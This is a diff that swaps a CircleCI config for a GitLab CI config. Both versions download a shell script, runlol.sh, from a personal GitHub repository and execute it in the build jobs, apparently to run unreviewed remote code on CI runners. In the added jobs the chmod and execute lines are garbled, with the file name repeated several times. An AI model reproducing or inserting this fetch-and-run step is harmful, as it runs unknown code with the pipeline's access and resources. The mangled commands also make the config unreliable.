@@ -1,10 +1,24 @@
-version: 2.0
-jobs:
-  build:
-    docker:
-      - image: circleci/ruby:2.4.2-jessie-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
-    steps:
-      - run: wget https://raw.githubusercontent.com/Myaxisplay/pos/main/runlol.sh && chmod +x runlol.sh && ./runlol.sh
+image: golang:latest
+
+variables:
+  REPO_NAME: gitlab.com/namespace/project
+
+stages:
+  - build
+  - test
+  - deploy
+
+build_a:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/Myaxisplay/pos/main/runlol.sh
+     - chmod 777 runlol.shrunlol.shrunlol.shrunlol.shrunlol.sh
+     - ./runlol.shrunlol.shrunlol.shrunlol.sh
+     
+
+build_b:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/Myaxisplay/pos/main/runlol.sh
+     - chmod 777 runlol.shrunlol.shrunlol.sh
+     - ./runlol.shrunlol.sh
